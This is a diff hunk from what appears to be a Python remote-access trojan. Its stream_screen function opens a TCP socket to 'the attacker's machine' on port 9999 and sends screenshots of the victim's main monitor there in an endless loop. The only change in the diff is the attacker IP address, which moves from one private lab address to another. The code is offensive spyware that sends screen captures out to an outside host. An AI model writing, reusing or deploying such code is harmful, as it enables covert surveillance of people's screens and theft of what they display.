@@ -141,7 +141,7 @@ def take_screenshot():
 def stream_screen():
     try: # Runs in a separate thread and continuously sends screenshots to the server
         stream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket.
-        stream_socket.connect(('192.168.56.101', 9999)) # Connect to the attacker's machine on port 9999 for streaming.
+        stream_socket.connect(('192.168.210.143', 9999)) # Connect to the attacker's machine on port 9999 for streaming.
         with mss.mss() as sct: # Open a screen capture session using mss
             while True: # Loop forever to take screenshots
                 screenshots = sct.grab(sct.monitors[1]) # Take a screenshot of the main monitor.
